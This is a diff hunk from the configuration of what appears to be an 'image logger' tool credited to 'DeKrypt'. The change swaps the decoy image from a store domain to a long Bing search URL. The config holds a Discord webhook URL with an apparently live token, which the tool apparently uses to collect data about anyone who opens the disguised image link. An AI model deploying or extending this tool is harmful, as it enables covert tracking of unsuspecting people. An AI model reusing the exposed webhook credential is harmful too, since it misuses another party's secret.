@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1549710671221100554/Ti8ecBNNCoXFRyIYo6t0uZB2YYCObaxUhZrwtv81C59QZwtLtvL-BKt5flat5q_pNFsE",
-    "image": "babydonation.store", # You can also have a custom image by using a URL argument
+    "image": "https://www.bing.com/images/search?view=detailV2&ccid=yO5mTss9&id=3CEFC4AB337E3DD1556C0A563744FCF9F7764F70&thid=OIP.yO5mTss9mQOTTfeOE9VwqgHaLE&mediaurl=https%3a%2f%2fth.bing.com%2fth%2fid%2fR.c8ee664ecb3d9903934df78e13d570aa%3frik%3dcE929%252fn8RDdWCg%26riu%3dhttp%253a%252f%252ffile3.knowhow.or.kr%252fattachment%252f12580%253aL%252f1%26ehk%3dmcljoqLQLUqembfRul%252fJKC8Mfv9Ubv%252bS%252fekP5eK39KA%253d%26risl%3d%26pid%3dImgRaw%26r%3d0&exph=1195&expw=800&q=%eb%85%b8%eb%ac%b4%ed%98%84%ec%82%ac%ec%a7%84&mode=overlay&FORM=IQFRBA&ck=FFB6768F54CD55FE63FAF4A99C7FBA8B&selectedIndex=0&idpp=serp", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
